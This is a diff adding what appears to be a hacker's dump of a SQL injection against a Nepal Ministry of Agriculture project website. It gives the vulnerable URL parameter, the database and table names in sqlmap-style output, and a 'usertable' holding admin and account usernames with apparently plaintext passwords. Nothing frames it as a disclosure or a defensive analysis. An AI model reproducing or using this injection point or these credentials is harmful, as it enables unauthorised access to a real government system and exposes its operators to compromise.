@@ -1,0 +1,58 @@
+.gov Government
+
+.np Nepal
+
+Government of Nepal
+
+Ministry of Agriculture and Livestock Development
+
+High Value Agriculture Project (HVAP)
+
+High Value Agriculture Project in Hill and Mountain Areas (HVAP)
+
+http://hvap.asdp.gov.np/publications.php?id=3
+
+the back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+
+available databases [2]:
+[+] hvapasdpgov_webdb
+[+] information_schema
+
+Database: hvapasdpgov_webdb
+[24 tables]
++------------------+
+| discussion       |
+| gallery          |
+| gallerydetails   |
+| hitcounter       |
+| rightphoto       |
+| tblbanner        |
+| tblbhuktani      |
+| tblcontacts      |
+| tbldocumentgroup |
+| tbldocuments     |
+| tbldownloadgroup |
+| tbldownloads     |
+| tblindex         |
+| tbllinks         |
+| tblmain          |
+| tblmenu          |
+| tblnews          |
+| tblnotice        |
+| tblslidingimage  |
+| tbltemplategroup |
+| tbltemplates     |
+| tbluploads       |
+| usertable        |
+| whoiswho         |
++------------------+
+
+Database: hvapasdpgov_webdb
+Table: usertable
+[2 entries]
++--------+-----------+---------------+
+| userid | usern     | userp         |
++--------+-----------+---------------+
+| 1      | admin@123 | 23vdsf%dsfsd3 |
+| 2      | account   | 23vdsf%dsfsd3 |
++--------+-----------+---------------+
